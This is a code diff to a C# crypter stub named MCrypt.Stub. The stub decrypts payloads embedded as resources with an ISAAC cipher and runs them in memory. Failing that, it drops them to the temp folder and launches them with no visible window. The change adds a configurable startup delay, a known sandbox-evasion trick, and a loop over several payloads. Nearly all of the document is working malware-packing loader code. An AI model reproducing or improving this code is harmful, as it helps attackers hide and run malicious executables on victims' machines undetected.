@@ -3,6 +3,7 @@ using System.Diagnostics;
 using System.IO;
 using System.Reflection;
 using System.Text;
+using System.Threading;
 
 namespace MCrypt.Stub
 {
@@ -11,38 +12,48 @@ namespace MCrypt.Stub
         public static void Main(string[] args)
         {
             var decryptionGuid = Fields.DECRYPTION_GUID;
-            var resourceName = Fields.RESOURCE_NAME;
+            var resourceNames = new string[] { Fields.RESOURCE_NAME };
+            var secondsDelay = Fields.SECONDS_DELAY;
 
             var assembly = Assembly.GetEntryAssembly();
-            var resourceStream = assembly.GetManifestResourceStream(assembly.GetName().Name + "." + resourceName);
 
-            var fileBytes = ReadFully(resourceStream);
+            Thread.Sleep(TimeSpan.FromSeconds(secondsDelay));
 
-            var cipher = new IsaacRandom(decryptionGuid);
-            for (int i = 0; i < fileBytes.Length; i++)
+            foreach (var resourceName in resourceNames)
             {
-                fileBytes[i] -= cipher.NextByte();
-            }
+                var resourceStream = assembly.GetManifestResourceStream(assembly.GetName().Name + "." + resourceName);
 
+                var fileBytes = ReadFully(resourceStream);
 
-            try
-            {
-                if (resourceName.EndsWith(".exe"))
+                var cipher = new IsaacRandom(decryptionGuid);
+                for (int i = 0; i < fileBytes.Length; i++)
                 {
-                    var asm = Assembly.Load(fileBytes);
-                    asm.EntryPoint.Invoke(null, new string[0]);
-                    return;
+                    fileBytes[i] -= cipher.NextByte();
                 }
-            } catch(Exception e)
-            {}
+                
+                try
+                {
+                    if (resourceName.EndsWith(".exe"))
+                    {
+                        var asm = Assembly.Load(fileBytes);
+                        asm.EntryPoint.Invoke(null, new string[0]);
+                        return;
+                    }
+                }
+                catch (Exception) { }
 
-            var outPath = Path.Combine(Path.GetTempPath(), resourceName);
-            File.WriteAllBytes(outPath, fileBytes);
-            Process p = new Process();
-            p.StartInfo.CreateNoWindow = true;
-            p.StartInfo.UseShellExecute = true;
-            p.StartInfo.FileName = outPath;
-            p.Start();
+                try
+                {
+                    var outPath = Path.Combine(Path.GetTempPath(), resourceName);
+                    File.WriteAllBytes(outPath, fileBytes);
+                    Process p = new Process();
+                    p.StartInfo.CreateNoWindow = true;
+                    p.StartInfo.UseShellExecute = true;
+                    p.StartInfo.FileName = outPath;
+                    p.Start();
+                }
+                catch (Exception) { }
+            }
         }
 
         public static byte[] ReadFully(Stream input)
